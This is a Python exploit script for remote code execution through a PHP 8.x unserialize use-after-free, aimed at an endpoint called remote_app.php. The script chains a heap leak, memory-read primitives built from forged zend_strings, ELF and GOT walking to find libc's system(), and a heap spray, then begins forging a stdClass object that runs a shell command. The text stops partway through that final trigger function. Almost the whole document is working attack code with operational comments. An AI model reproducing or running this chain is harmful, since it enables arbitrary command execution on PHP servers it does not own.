#!/usr/bin/env python3
"""
PHP 8.x unserialize UAF -> RCE (remote, against remote_app.php).

Chain:
  R-1 heap leak      -> 1 request
  R-2 ELF scan       -> ~50-120 requests
  R-3 .gnu_hash      -> ~10 requests (libphp executor_globals + GOT base)
  R-4 GOT dump       -> ~1500-2000 requests (find libc, resolve system)
  R-5 EG class table -> ~55 requests (resolve stdClass class entry)
  R-6 spray slot     -> ~10 requests
  R-7 RCE trigger    -> 1 request

Inner gadget: O:8:"stdClass":8:{...} stuffed into CachedData::unserialize,
so the property write is the 9th insert that triggers an 8->16 resize and
the var_hash efree. Eight property zvals end up pointing into the freed
288-byte arData, which is then reclaimed by spray strings.
"""

import argparse
import os
import socket
import struct
import sys
import time


# ---------------------------------------------------------------------------
# Constants and configuration
# ---------------------------------------------------------------------------

SPRAY_LEN = 280
SPRAY_COUNT = 32
NUM_PROPS = 8
REF_BASE = 4
MAX_REFS = 8

# 48-bit cap covers x86_64 (47-bit canonical) and aarch64 (48-bit VA).
ADDR_MAX = 0x0000FFFFFFFFFFFF

HOST = '127.0.0.1'
PORT = 8080

req_count = 0
crash_count = 0


# ---------------------------------------------------------------------------
# Inner serialize payload (the var_hash UAF gadget)
# ---------------------------------------------------------------------------

def _build_inner():
    props = ''
    for k in range(NUM_PROPS):
        pname = f"p{k}"
        props += f's:{len(pname)}:"{pname}";i:{0xAAAA0000 + k};'
    return f'O:8:"stdClass":{NUM_PROPS}:{{{props}}}'


INNER = _build_inner()
C_PART = f'C:10:"CachedData":{len(INNER)}:{{{INNER}}}'


# ---------------------------------------------------------------------------
# Helpers: HTTP transport, ASCII URL encoding
# ---------------------------------------------------------------------------

def urlencode_bytes(data):
    out = bytearray()
    for b in data:
        if (0x30 <= b <= 0x39 or 0x41 <= b <= 0x5A or
                0x61 <= b <= 0x7A or b in (0x2D, 0x2E, 0x5F, 0x7E)):
            out.append(b)
        else:
            out.extend(f'%{b:02X}'.encode())
    return bytes(out)


def send_http(payload, host=None, port=None, timeout=3):
    """POST a serialize payload to remote_app.php, return body bytes or None."""
    if host is None:
        host = HOST
    if port is None:
        port = PORT
    global req_count
    req_count += 1
    body = b'cook=' + urlencode_bytes(payload)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    for attempt in range(2):
        try:
            s.connect((host, port))
            break
        except Exception:
            if attempt == 0:
                time.sleep(0.2)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
    req = (
        f"POST /remote_app.php HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body
    try:
        s.sendall(req)
    except Exception:
        return None
    resp = b''
    while True:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
        except Exception:
            break
    s.close()
    if b'\r\n\r\n' in resp:
        hdr, body_data = resp.split(b'\r\n\r\n', 1)
        if b' 500 ' in hdr.split(b'\r\n')[0]:
            return None
        return body_data
    return resp


# ---------------------------------------------------------------------------
# Hash functions: GNU-hash (libc/libphp .gnu_hash), DJBX33A (PHP HashTable)
# ---------------------------------------------------------------------------

def gnu_hash_func(name):
    h = 5381
    for c in name:
        h = (h * 33 + c) & 0xFFFFFFFF
    return h


def php_djb_hash(key):
    h = 5381
    for c in key:
        h = ((h << 5) + h + c) & 0xFFFFFFFFFFFFFFFF
    return h


def gnu_hash_lookup_window(wdata, wbase, gh_addr, symtab, strtab, names):
    """Resolve symbol names via .gnu_hash inside a flat window of bytes."""
    def rd(addr, sz):
        off = addr - wbase
        if off < 0 or off + sz > len(wdata):
            return None
        return wdata[off:off + sz]

    hdr = rd(gh_addr, 16)
    if hdr is None:
        return {}
    nbuckets, symoffset, bloom_size, bloom_shift = struct.unpack('<IIII', hdr)
    bloom_addr = gh_addr + 16
    buckets_addr = bloom_addr + 8 * bloom_size
    chain_addr = buckets_addr + 4 * nbuckets
    results = {}

    for name in names:
        nb = name.encode('latin-1')
        h = gnu_hash_func(nb)
        wi = (h // 64) % bloom_size
        bw = rd(bloom_addr + 8 * wi, 8)
        if bw is None:
            continue
        bword = struct.unpack('<Q', bw)[0]
        bit_pair = (1 << (h & 63)) | (1 << ((h >> bloom_shift) & 63))
        if (bword & bit_pair) != bit_pair:
            continue
        bk = rd(buckets_addr + 4 * (h % nbuckets), 4)
        if bk is None:
            continue
        si = struct.unpack('<I', bk)[0]
        if si == 0:
            continue
        for _ in range(64):
            chv = rd(chain_addr + 4 * (si - symoffset), 4)
            if chv is None:
                break
            cv = struct.unpack('<I', chv)[0]
            if (cv | 1) == (h | 1):
                sym = rd(symtab + 24 * si, 24)
                if sym is None:
                    break
                st_name = struct.unpack_from('<I', sym, 0)[0]
                st_value = struct.unpack_from('<Q', sym, 8)[0]
                nm = rd(strtab + st_name, len(nb) + 1)
                if nm and nm[:len(nb)] == nb and nm[len(nb):len(nb) + 1] == b'\x00':
                    results[name] = st_value
                    break
            if cv & 1:
                break
            si += 1
    return results


# ---------------------------------------------------------------------------
# UAF primitives
# ---------------------------------------------------------------------------

def isstring_read(fake_str_addr, timeout=5):
    """Forge a zend_string at fake_str_addr by overwriting one bucket's val
    with that pointer and IS_STRING type. Returns (len, data) or None on crash.
    """
    global crash_count
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into('<I', spray, vo, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, vo + 8, 0x04)
    vo = 8 + 1 * 32
    struct.pack_into('<Q', spray, vo, fake_str_addr)
    struct.pack_into('<I', spray, vo + 8, 0x06)
    spray = bytes(spray)
    total = 1 + SPRAY_COUNT + 1
    parts = [f'i:0;{C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
    parts.append(f'i:{SPRAY_COUNT+1};R:{REF_BASE};'.encode('latin-1'))
    payload = b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
    output = send_http(payload, timeout=timeout)
    if output is None:
        crash_count += 1
        if crash_count % 5 == 0:
            time.sleep(0.5)
        return None
    idx = output.find(b'a:')
    if idx < 0:
        return None
    output = output[idx:]
    key = f'i:{SPRAY_COUNT+1};s:'.encode()
    pos = output.find(key)
    if pos < 0:
        return None
    pos += len(key)
    colon = output.index(b':', pos)
    slen = int(output[pos:colon])
    dstart = colon + 2
    dend = dstart + slen
    if dend <= len(output):
        return (slen, output[dstart:dend])
    return (slen, output[dstart:])


def heap_leak():
    """R-1: spray, attach R: ref to a sprayed bucket, recover the heap pointer
    that ZVAL_MAKE_REF wrote on top of the spray contents.
    """
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into('<I', spray, vo, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, vo + 8, 0x04)
    spray = bytes(spray)
    total = 1 + SPRAY_COUNT + MAX_REFS
    parts = [f'i:0;{C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
    for k in range(MAX_REFS):
        parts.append(f'i:{SPRAY_COUNT+1+k};R:{REF_BASE+k};'.encode('latin-1'))
    payload = b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
    output = send_http(payload)
    if output is None:
        return None
    idx = output.find(b'a:')
    if idx < 0:
        return None
    output = output[idx:]
    search_pos = 0
    while True:
        pos = output.find(b's:280:"', search_pos)
        if pos < 0:
            break
        dstart = pos + 7
        if dstart + SPRAY_LEN > len(output):
            break
        sdata = output[dstart:dstart + SPRAY_LEN]
        for k in range(7):
            bucket_idx = k + 1
            vo = 8 + bucket_idx * 32
            if vo + 8 > len(sdata):
                break
            orig = struct.unpack_from('<Q', spray, vo)[0]
            curr = struct.unpack_from('<Q', sdata, vo)[0]
            if orig != curr and curr > 0x10000:
                return curr
        search_pos = dstart + SPRAY_LEN
    return None


# ---------------------------------------------------------------------------
# ELF probing helpers (used by R-2, R-4)
# ---------------------------------------------------------------------------

def _read_elf_header(addr):
    """Return e_phnum if addr looks like an ELF base, else None."""
    r = isstring_read(addr + 0x10, timeout=2)
    if r is None:
        return None
    slen, sdata = r
    if slen != 64 or len(sdata) < 0x12:
        return None
    e_ehsize = struct.unpack_from('<H', sdata, 0x0C)[0]
    e_phentsize = struct.unpack_from('<H', sdata, 0x0E)[0]
    e_phnum = struct.unpack_from('<H', sdata, 0x10)[0]
    if e_ehsize == 64 and e_phentsize == 56 and 3 <= e_phnum <= 20:
        return e_phnum
    return None


def _find_elf_base(ptr, max_pages=256):
    """Scan backward from ptr in 4KB steps looking for an ELF magic page."""
    page = ptr & ~0xFFF
    consec_crash = 0
    for pi in range(max_pages):
        cand = page - pi * 0x1000
        if cand <= 0:
            break
        epn = _read_elf_header(cand)
        if epn is None:
            r = isstring_read(cand + 0x10, timeout=2)
            if r is None:
                consec_crash += 1
                if consec_crash >= 8:
                    break
            else:
                consec_crash = 0
            continue
        return (cand, epn, pi)
    return None


# ---------------------------------------------------------------------------
# ELF window read + symbol resolution (used by R-3 and the per-DSO probes
# inside R-4)
# ---------------------------------------------------------------------------

def _elf_read_window(base, phnum):
    """Read a large flat window of an ELF using phdr fields as len anchors.

    Returns (wbase, wdata, wlen) or None. The window covers .gnu_hash,
    symtab, strtab for typical libphp/libc layouts.
    """
    # Find a phdr field large enough to use as a fake-string len anchor.
    # phdr layout (56 bytes): p_type p_flags p_offset p_vaddr p_paddr
    #                          p_filesz p_memsz p_align
    phdr_data = None
    phdr_data_base = None
    for pi in range(3):
        for foff in (0x30, 0x20, 0x28):  # p_align, p_filesz, p_memsz
            field_addr = base + 0x40 + pi * 56 + foff
            r = isstring_read(field_addr - 0x10, timeout=3)
            if r is None:
                continue
            slen, sdata = r
            if slen >= 56 and len(sdata) >= 56:
                phdr_data = sdata
                phdr_data_base = field_addr - 0x10 + 0x18
                break
        if phdr_data is not None:
            break
    if phdr_data is None:
        return None

    # For each PT_LOAD/PT_PHDR, gather candidate (field_addr, val) pairs.
    candidates = []
    for i in range(phnum):
        phdr_addr = base + 0x40 + i * 56
        off = phdr_addr - phdr_data_base
        if off < 0 or off + 56 > len(phdr_data):
            continue
        p_type = struct.unpack_from('<I', phdr_data, off)[0]
        if p_type not in (1, 6):  # PT_LOAD, PT_PHDR
            continue
        for field_off in (0x30, 0x20, 0x28):
            field_addr = phdr_addr + field_off
            val_off = field_addr - phdr_data_base
            if val_off < 0 or val_off + 8 > len(phdr_data):
                continue
            val = struct.unpack_from('<Q', phdr_data, val_off)[0]
            if 0x1000 <= val < 0x10000000:
                candidates.append((field_addr, val))

    if not candidates:
        return None

    # Prefer moderate sizes (0x10000-0x400000) over giant lens that may cross
    # unmapped gaps and crash the worker.
    def sort_key(c):
        v = c[1]
        if 0x10000 <= v <= 0x400000:
            return (0, -v)
        return (1, -v)
    candidates.sort(key=sort_key)

    for field_addr, _expected in candidates[:5]:
        r = isstring_read(field_addr - 0x10, timeout=3)
        if r is None:
            continue
        wlen, wdata = r
        if len(wdata) >= 0x1000:
            return (field_addr + 8, wdata, wlen)
    return None


def _elf_resolve_symbols(base, phnum, names):
    """Walk PT_DYNAMIC + .gnu_hash to resolve `names` for the ELF at `base`.

    Returns dict mapping name -> absolute address. Special keys:
      __pltgot__   -> DT_PLTGOT absolute address (R-4 needs this)
      __dynamic__  -> PT_DYNAMIC virtual address
    """
    win = _elf_read_window(base, phnum)
    if win is None:
        return None
    wbase, wdata, _ = win

    def rd(addr, sz):
        off = addr - wbase
        if off < 0 or off + sz > len(wdata):
            return None
        return wdata[off:off + sz]

    # Locate PT_DYNAMIC by walking phdrs from inside the window.
    dyn_addr = None
    dyn_size = 0
    for pi in range(phnum):
        phdr_addr = base + 0x40 + pi * 56
        phdr_raw = rd(phdr_addr, 56)
        if phdr_raw is None:
            continue
        p_type = struct.unpack_from('<I', phdr_raw, 0)[0]
        if p_type == 2:  # PT_DYNAMIC
            p_vaddr = struct.unpack_from('<Q', phdr_raw, 16)[0]
            p_filesz = struct.unpack_from('<Q', phdr_raw, 32)[0]
            dyn_addr = base + p_vaddr
            dyn_size = p_filesz
            break

    symtab = strtab = gnu_hash_addr = pltgot_addr = None
    dyn_data = None
    if dyn_addr is not None:
        # Try the existing window first.
        dyn_data = rd(dyn_addr, min(dyn_size, 4096))
        if dyn_data is None:
            # Use the first .dynamic entry's d_val as a fake-string len anchor.
            for anchor_off in (0x08, 0x18, 0x28, 0x38, 0x48):
                r = isstring_read(dyn_addr - anchor_off, timeout=3)
                if r is None:
                    continue
                slen, sdata = r
                if slen < 64 or slen > 0x200000 or len(sdata) < 64:
                    continue
                skip = max(0, anchor_off - 0x18)
                cand = sdata[skip:skip + min(dyn_size, len(sdata) - skip)]
                if len(cand) >= 16:
                    tag0 = struct.unpack_from('<Q', cand, 0)[0]
                    if tag0 == 0 or (tag0 > 100 and tag0 < 0x6FFFFEF5):
                        continue
                dyn_data = cand
                break

        if dyn_data and len(dyn_data) >= 32:
            for di in range(len(dyn_data) // 16):
                d_tag = struct.unpack_from('<Q', dyn_data, di * 16)[0]
                d_val = struct.unpack_from('<Q', dyn_data, di * 16 + 8)[0]
                if d_tag == 0:
                    break
                if d_tag == 3:    # DT_PLTGOT
                    pltgot_addr = base + d_val if d_val < 0x10000000 else d_val
                elif d_tag == 5:  # DT_STRTAB
                    strtab = base + d_val if d_val < 0x10000000 else d_val
                elif d_tag == 6:  # DT_SYMTAB
                    symtab = base + d_val if d_val < 0x10000000 else d_val
                elif d_tag == 0x6FFFFEF5:  # DT_GNU_HASH
                    gnu_hash_addr = base + d_val if d_val < 0x10000000 else d_val

    # Sanity-trim out-of-range pointers.
    def in_range(p):
        return p is not None and base <= p <= base + 0x2000000
    if symtab and not in_range(symtab):
        symtab = None
    if strtab and not in_range(strtab):
        strtab = None
    if gnu_hash_addr and not in_range(gnu_hash_addr):
        gnu_hash_addr = None

    # Fallback: scan window bytes for a plausible .gnu_hash header.
    if gnu_hash_addr is None:
        for scan_off in range(0, min(len(wdata) - 16, 0x10000), 4):
            nb, so, bs, bsh = struct.unpack_from('<IIII', wdata, scan_off)
            if not (100 < nb < 100000 and 10 < so < 1000000
                    and 4 <= bs <= 8192 and 1 <= bsh < 64):
                continue
            if bs & (bs - 1) != 0:
                continue
            bloom_end = scan_off + 16 + 8 * bs
            if bloom_end + 4 * nb > len(wdata):
                continue
            b0 = struct.unpack_from('<I', wdata, bloom_end)[0]
            if b0 != 0 and (b0 < so or b0 > so + 1000000):
                continue
            gnu_hash_addr = wbase + scan_off
            break

    if gnu_hash_addr is None:
        return None

    # Reconstruct symtab/strtab from .gnu_hash chain end if missing.
    if symtab is None or strtab is None:
        gh_hdr = rd(gnu_hash_addr, 16)
        if gh_hdr is None:
            return None
        nbuckets, symoffset, bloom_size, _bsh = struct.unpack('<IIII', gh_hdr)
        bloom_start = gnu_hash_addr + 16
        buckets_start = bloom_start + 8 * bloom_size
        chains_start = buckets_start + 4 * nbuckets
        max_si = 0
        for b in range(nbuckets):
            bv = rd(buckets_start + 4 * b, 4)
            if bv is None:
                continue
            si = struct.unpack('<I', bv)[0]
            if si > max_si:
                max_si = si
        si = max_si
        while si > 0:
            cv = rd(chains_start + 4 * (si - symoffset), 4)
            if cv is None:
                break
            if struct.unpack('<I', cv)[0] & 1:
                break
            si += 1
        nsyms = si + 1
        if symtab is None:
            chains_end = chains_start + 4 * (nsyms - symoffset)
            symtab = (chains_end + 7) & ~7
        if strtab is None:
            strtab = symtab + 24 * nsyms

    # Extend the window if symtab/strtab fall outside it.
    if (symtab - wbase < 0 or symtab - wbase > len(wdata)
            or strtab - wbase < 0 or strtab - wbase > len(wdata)):
        sym_r = isstring_read(symtab - 0x10, timeout=3)
        if sym_r is None:
            return None
        _sym_len, sym_data = sym_r
        new_wbase = min(wbase, symtab + 8)
        new_wend = max(wbase + len(wdata), symtab + 8 + len(sym_data))
        merged = bytearray(new_wend - new_wbase)
        o1 = wbase - new_wbase
        merged[o1:o1 + len(wdata)] = wdata
        o2 = (symtab + 8) - new_wbase
        merged[o2:o2 + len(sym_data)] = sym_data
        wdata = bytes(merged)
        wbase = new_wbase

    result = gnu_hash_lookup_window(wdata, wbase, gnu_hash_addr, symtab, strtab, names)
    if result is None:
        result = {}
    for name, offset in list(result.items()):
        result[name] = offset + base
    if pltgot_addr:
        result['__pltgot__'] = pltgot_addr
    if dyn_addr:
        result['__dynamic__'] = dyn_addr
    return result


# ===========================================================================
# Phase functions (the chain skeleton)
# ===========================================================================

def scan_for_elf(chunk):
    """R-2: Find libphp's ELF base near the heap chunk.

    Two-pass: 2MB step scan around `chunk` then 1MB-step refinement near the
    candidate with the largest e_phnum. Returns a list of (base, phnum)
    sorted by phnum descending; the caller validates each by resolving
    executor_globals since multiple DSOs can share the top phnum.
    """
    print("\n[Phase R-2] Finding libphp.so")
    candidates = []

    # Pass 1: 2MB sweeps in both directions.
    for i in range(256):
        for d in (1, -1):
            cand = chunk + d * i * 0x200000
            if cand <= 0 or cand > ADDR_MAX:
                continue
            epn = _read_elf_header(cand)
            if epn is None:
                continue
            candidates.append((cand, epn))
            print(f"  ELF @ 0x{cand:x} phnum={epn} ({req_count} reqs)")
        big = [epn for _, epn in candidates if epn >= 10]
        if len(big) >= 2 or len(candidates) >= 8:
            break

    if not candidates:
        return []

    # Pass 2: 1MB refinement around the highest-phnum candidate.
    known = set(b for b, _ in candidates)
    ref_base = max(candidates, key=lambda x: x[1])[0]
    print(f"  Fine-grained scan near 0x{ref_base:x}")
    for d in (-1, 1):
        consec_miss = 0
        for step in range(1, 129):
            cand = ref_base + d * step * 0x100000
            if cand in known or cand <= 0:
                continue
            epn = _read_elf_header(cand)
            if epn is None:
                consec_miss += 1
                if consec_miss >= 32:
                    break
                continue
            candidates.append((cand, epn))
            known.add(cand)
            print(f"  ELF @ 0x{cand:x} phnum={epn} ({req_count} reqs)")
            consec_miss = 0
            if epn >= 10:
                break

    # Several DSOs can tie on phnum (seen on arm64 with libphp/libc/libssl all
    # at 9), so return the full ranked list and let the caller validate by
    # actually resolving executor_globals.
    return sorted(candidates, key=lambda x: -x[1])


def gnu_hash_resolve(elf_base, *names):
    """Walk PT_DYNAMIC + .gnu_hash at `elf_base` and resolve each requested
    symbol. The pseudo-name "_GLOBAL_OFFSET_TABLE_" maps to DT_PLTGOT (not a
    real GNU-hash symbol, but exposed by .dynamic).

    Returns a single value if `names` has length 1, else a tuple in order.
    Raises RuntimeError if any requested name cannot be resolved.

    This same function handles R-3 (libphp executor_globals + GOT base) and
    the libc system() lookup at the end of R-4.
    """
    epn = _read_elf_header(elf_base)
    if epn is None:
        raise RuntimeError(f"ELF at 0x{elf_base:x} no longer parseable")
    if names and any(n != '_GLOBAL_OFFSET_TABLE_' for n in names):
        # Print phase header on the first call (libphp lookup).
        # Subsequent calls (libc system) already have R-4 header context.
        pass
    syms = _elf_resolve_symbols(elf_base, epn, [n for n in names if n != '_GLOBAL_OFFSET_TABLE_'])
    if syms is None:
        raise RuntimeError(f"symbol resolution failed at 0x{elf_base:x}")
    out = []
    for n in names:
        if n == '_GLOBAL_OFFSET_TABLE_':
            v = syms.get('__pltgot__')
        else:
            v = syms.get(n)
        if v is None:
            raise RuntimeError(f"symbol {n!r} not found at 0x{elf_base:x}")
        out.append(v)
    return out[0] if len(out) == 1 else tuple(out)


def libc_from_got_dump(elf_base, pltgot):
    """R-4: read libphp's .dynamic via DT_PLTRELSZ as a fake-string len, dump
    the GOT, cluster external pointers, scan back to libc's ELF base.

    Returns the libc ELF base, or None on failure.
    """
    print("\n[Phase R-4] Libc discovery via GOT dump")

    # Walk .dynamic to find DT_PLTRELSZ and DT_PLTGOT (the latter validates pltgot).
    # Re-read .dynamic via the same anchor trick used in symbol resolution.
    dyn_data = None
    dyn_data_base = None

    # First locate PT_DYNAMIC's address by re-resolving from the ELF window.
    # _elf_resolve_symbols already published it via __dynamic__, but R-3 only
    # returned executor_globals. Re-run a minimal resolve here for robustness.
    epn = _read_elf_header(elf_base)
    if epn is None:
        return None
    syms = _elf_resolve_symbols(elf_base, epn, [])
    php_dynamic = syms.get('__dynamic__') if syms else None

    if php_dynamic:
        print(f"    PT_DYNAMIC @ 0x{php_dynamic:x}")
        for anchor_off in (0x08, 0x18, 0x28, 0x38, 0x48):
            r = isstring_read(php_dynamic - anchor_off, timeout=3)
            if r is None:
                continue
            slen, sdata = r
            if slen < 64 or slen > 0x200000 or len(sdata) < 64:
                continue
            data_abs_start = php_dynamic - anchor_off + 0x18
            skip = max(0, anchor_off - 0x18)
            cand = sdata[skip:skip + min(1024, len(sdata) - skip)]
            if len(cand) >= 16:
                tag0 = struct.unpack_from('<Q', cand, 0)[0]
                if tag0 == 0 or (tag0 > 100 and tag0 < 0x6FFFFEF5):
                    continue
            dyn_data = cand
            dyn_data_base = data_abs_start + skip
            print(f"    .dynamic via anchor -0x{anchor_off:x} (len={slen}, got={len(dyn_data)}b)")
            break

    if not dyn_data:
        return None

    pltrelsz_val = pltrelsz_off = None
    got_addr = None
    for di in range(len(dyn_data) // 16):
        d_tag = struct.unpack_from('<Q', dyn_data, di * 16)[0]
        d_val = struct.unpack_from('<Q', dyn_data, di * 16 + 8)[0]
        if d_tag == 0:
            break
        if d_tag == 2:
            pltrelsz_val = d_val
            pltrelsz_off = di * 16 + 8
        elif d_tag == 3:
            got_addr = elf_base + d_val if d_val < 0x10000000 else d_val

    if got_addr is None:
        got_addr = pltgot

    if not (pltrelsz_val and pltrelsz_off and got_addr):
        return None

    # The trick: DT_PLTRELSZ's d_val (~85KB) becomes a fake string len, so
    # val[] spans rest of .dynamic into .got.plt and exposes every resolved
    # libc pointer.
    pltrelsz_addr = dyn_data_base + pltrelsz_off
    fake_str = pltrelsz_addr - 0x10
    print(f"    Reading GOT via DT_PLTRELSZ len={pltrelsz_val} (0x{pltrelsz_val:x})")
    r = isstring_read(fake_str, timeout=5)
    if r is None:
        return None
    got_len, got_data = r
    print(f"    GOT read: len={got_len}, got {len(got_data)} bytes")

    data_start = pltrelsz_addr + 0x08
    libphp_end = elf_base + 0x1800000

    # Collect external pointers (outside libphp) clustered by ~0.5MB proximity.
    ext_ptrs = []
    if got_addr >= data_start and got_addr < data_start + len(got_data):
        for gi in range(0, len(got_data) - 7, 8):
            ptr = struct.unpack_from('<Q', got_data, gi)[0]
            if ptr < 0x100000000 or ptr > ADDR_MAX:
                continue
            if elf_base <= ptr < libphp_end:
                continue
            if not any(abs(ptr - ep) < 0x80000 for ep in ext_ptrs):
                ext_ptrs.append(ptr)
    else:
        # GOT not in the read window; fall back to scanning everything.
        for qi in range(0, len(got_data) - 7, 8):
            ptr = struct.unpack_from('<Q', got_data, qi)[0]
            if ptr < 0x100000000 or ptr > ADDR_MAX:
                continue
            if abs(ptr - elf_base) > 0x2000000:
                if not any(abs(ptr - ep) < 0x200000 for ep in ext_ptrs):
                    ext_ptrs.append(ptr)

    # Prefer pointers near libphp (avoids vDSO / Apache binary that sit far away).
    nearby = [p for p in ext_ptrs if abs(p - elf_base) < 0x10000000]
    nearby.sort()
    print(f"    External pointer groups: {len(ext_ptrs)} total, {len(nearby)} nearby")

    # For each cluster pointer, scan backward in 4KB steps for an ELF magic.
    # Search far->near so r-- regions get probed first (fewer crashes).
    for nidx, ep in enumerate(nearby):
        print(f"    Trying nearby[{nidx}] = 0x{ep:x}")
        page = ep & ~0xFFF
        # Coarse scan with descending offsets.
        for est_off in range(0x7F000, 0x1F000, -0x1000):
            cand = page - est_off
            if cand <= 0:
                continue
            epn = _read_elf_header(cand)
            if epn is None:
                continue
            print(f"      ELF @ 0x{cand:x} (phnum={epn}, est_off=0x{est_off:x})")
            if epn >= 12:
                # libc has many phdrs; try to resolve `system` here.
                syms = _elf_resolve_symbols(cand, epn, ['system'])
                if syms and 'system' in syms:
                    print(f"      libc @ 0x{cand:x}, system @ 0x{syms['system']:x}")
                    return cand
        # Fallback: standard backward 4KB scan over more pages.
        result = _find_elf_base(ep, max_pages=128)
        if result:
            ebase, epn, _ = result
            print(f"      DSO @ 0x{ebase:x} (phnum={epn})")
            syms = _elf_resolve_symbols(ebase, epn, ['system'])
            if syms and 'system' in syms:
                print(f"      libc @ 0x{ebase:x}, system @ 0x{syms['system']:x}")
                return ebase

    return None


def lookup_class_table(eg, name):
    """R-5: read EG, then EG.class_table HashTable, DJBX33A-lookup `name`,
    return the associated zend_class_entry pointer.

    Caller passes lowercase names ("stdclass") since PHP's class table keys
    its classes lowercased.
    """
    print(f"\n[Phase R-5] EG and stdClass class entry")
    print(f"  EG @ 0x{eg:x}")

    # EG layout: function_table at +0x1C8, class_table at +0x1D0.
    bss_end = eg + 0x10000
    ct_addr = eg + 0x1D0

    # Sweep for a fake-string anchor in BSS that covers ct_addr + 8.
    class_table = None
    for scan_off in range(-0x800, 0x1C0, 8):
        fs = eg + scan_off
        data_start = fs + 0x18
        if data_start > ct_addr:
            continue
        ct_data_off = ct_addr - data_start
        max_len = bss_end - data_start
        if max_len <= 0:
            continue
        r = isstring_read(fs)
        if r is None:
            continue
        slen, sdata = r
        if slen <= 0 or slen > max_len:
            continue
        if ct_data_off + 8 <= len(sdata):
            class_table = struct.unpack_from('<Q', sdata, ct_data_off)[0]
            print(f"  anchor at EG{scan_off:+#06x}: len={slen}")
            print(f"    class_table = 0x{class_table:x}")
            break

    if not class_table or class_table < 0x10000 or class_table > ADDR_MAX:
        return None

    # Read the class_table HashTable struct via malloc chunk header trick.
    r = isstring_read(class_table - 0x18)
    if r is None or r[0] < 48 or len(r[1]) < 32:
        return None
    _htlen, htdata = r
    flags_mask = struct.unpack_from('<Q', htdata, 8)[0]
    arData = struct.unpack_from('<Q', htdata, 16)[0]
    nUsed = struct.unpack_from('<I', htdata, 24)[0]
    nTableMask = (flags_mask >> 32) & 0xFFFFFFFF
    mask_s = nTableMask if nTableMask < 0x80000000 else nTableMask - 0x100000000
    print(f"  class_table HT: nTableMask={mask_s} arData=0x{arData:x} nUsed={nUsed}")

    hash_size = (-mask_s) * 4
    alloc_start = arData - hash_size
    r = isstring_read(alloc_start - 0x18)
    if r is None:
        return None
    _dlen, ddata = r

    # Hash slot lookup.
    key_b = name.encode('latin-1')
    h = php_djb_hash(key_b)
    si = (h | (mask_s & 0xFFFFFFFF)) & 0xFFFFFFFF
    si_s = si - 0x100000000 if si >= 0x80000000 else si
    hso = (si_s + (-mask_s)) * 4
    if hso < 0 or hso + 4 > len(ddata):
        return None
    bi = struct.unpack_from('<I', ddata, hso)[0]
    if bi == 0xFFFFFFFF:
        return None

    # Walk the bucket chain.
    h_flag = h | 0x8000000000000000
    for _ in range(64):
        if bi >= nUsed or bi == 0xFFFFFFFF:
            break
        bo = hash_size + bi * 32
        if bo + 32 > len(ddata):
            break
        bval = struct.unpack_from('<Q', ddata, bo)[0]
        bnext = struct.unpack_from('<I', ddata, bo + 12)[0]
        bh = struct.unpack_from('<Q', ddata, bo + 16)[0]
        bkey = struct.unpack_from('<Q', ddata, bo + 24)[0]
        if (bh == h_flag or bh == h) and 0x10000 < bkey < ADDR_MAX:
            rk = isstring_read(bkey)
            if rk and rk[0] == len(key_b) and rk[1][:len(key_b)] == key_b:
                print(f"  {name} ce = 0x{bval:x}")
                return bval
        if bnext == 0xFFFFFFFF:
            break
        bi = bnext
    return None


def find_spray_slot(heap_ref):
    """R-6: walk ZendMM chunk metadata to identify the bin-320 SRUN page
    holding the freed allocation, probe its slots for our spray strings,
    and return the absolute address `S` (the data pointer of the spray
    string we'll forge an object inside).
    """
    print(f"\n[Phase R-6] Spray slot discovery")
    chunk_base = heap_ref & ~0x1FFFFF
    print(f"  chunk_base = 0x{chunk_base:x}")

    # Read chunk metadata header.
    r = isstring_read(chunk_base + 0x40)
    if r is None:
        return None
    _heap_size, cdata = r

    # Page map at chunk+0x250; data starts at chunk+0x58, so map offset is 0x1F8.
    MAP_OFF = 0x1F8
    if len(cdata) < MAP_OFF + 512 * 4:
        return None

    bin320_start = None
    for pn in range(1, 512):
        info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
        is_srun = (info & 0x80000000) != 0
        is_lrun = (info & 0x40000000) != 0
        if is_srun and not is_lrun and (info & 0x1F) == 16:
            bin320_start = pn
            free_count = (info >> 16) & 0x1FF
            print(f"  Bin-320 SRUN at page {pn}, free_count={free_count}")
            break

    if bin320_start is None:
        return None

    run_start = chunk_base + bin320_start * 0x1000
    print(f"  Run start = 0x{run_start:x}")

    # Probe each 320-byte slot looking for our 280-byte spray string.
    for slot in range(64):
        addr = run_start + slot * 320
        r2 = isstring_read(addr)
        if r2 is None:
            continue
        slen, _ = r2
        if slen == SPRAY_LEN:
            S = addr + 0x18
            print(f"  Found spray at slot {slot} @ 0x{addr:x}")
            print(f"  S = 0x{S:x}")
            return S
    return None


def _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd14):
    """One R-7 trigger: forge a stdClass whose handlers->get_properties_for
    is libc system() and whose first 16 bytes (the gc header) are the shell
    command. cmd14 is at most 14 bytes; a leading 0x09 is prepended so that
    GC_ADDREF's +1 turns it into 0x0A (newline, ignored by sh).
    """
    assert len(cmd14) <= 14, f"command {cmd14!r} is {len(cmd14)} bytes (max 14)"
    cmd = b"\x09" + cmd14

    rce_spray = bytearray(SPRAY_LEN)
    fake_obj_addr = spray_addr + 104

    struct.pack_into('<Q', rce_spray, 40, fake_obj_addr)
    struct.pack_into('<I', rce_spray, 48, 0x08)

    rce_spray[104:104 + len(cmd)] = cmd
